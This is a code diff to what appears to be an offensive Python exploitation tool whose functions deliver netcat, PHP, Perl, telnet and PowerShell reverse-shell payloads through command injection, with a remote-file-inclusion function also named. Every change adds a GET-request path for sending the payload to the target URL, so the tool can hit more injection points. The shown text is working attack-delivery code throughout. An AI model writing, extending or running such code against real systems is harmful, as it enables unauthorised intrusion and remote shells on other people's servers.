@@ -590,6 +590,7 @@ def exploit_nc(exploit, method, ip, port):
             printInfo(ip, port, "nc", "command injection")
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, ncPayload), headers = headers, proxies = proxies)
+            else: requests.get(url.replace(tempArg, ncPayload), headers  = headers, proxies =  proxies)
             return True
 
 
@@ -635,6 +636,7 @@ def exploit_php(exploit, method, ip, port):
             printInfo(ip, port, "php", "command injection")
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, phpPayload), headers = headers, proxies = proxies)
+            else: requests.get(url.replace(tempArg, phpPayload), headers = headers, proxies = proxies)
             return True
 
 def exploit_perl(exploit, method, ip, port):
@@ -681,6 +683,7 @@ def exploit_perl(exploit, method, ip, port):
             printInfo(ip, port, "perl", "command injection")
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, perlPayload), headers = headers, proxies = proxies)
+            else: requests.get(url.replace(tempArg, perlPayload), headers = headers, proxies = proxies)
             return True
 
 def exploit_telnet(exploit, method, ip, port):
@@ -727,6 +730,7 @@ def exploit_telnet(exploit, method, ip, port):
             printInfo(ip, port, "telnet", "command injection")
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, telnetPayload), headers = headers, proxies = proxies)
+            else: requests.get(url.replace(tempArg, telnetPayload), headers = headers, proxies = proxies)
             return True
 
 def exploit_powershell(exploit, method, ip, port):
@@ -780,6 +784,7 @@ def exploit_powershell(exploit, method, ip, port):
             printInfo(ip, port, "powershell", "command injection")
             if(args.postreq):
                 requests.post(url, data = post.replace(tempArg, powershellPayload), headers = headers, proxies = proxies)
+            else: requests.get(url.replace(tempArg, powershellPayload), headers = headers, proxies = proxies)
             return True
 
 def exploit_rfi(exploit, method, ip, port):
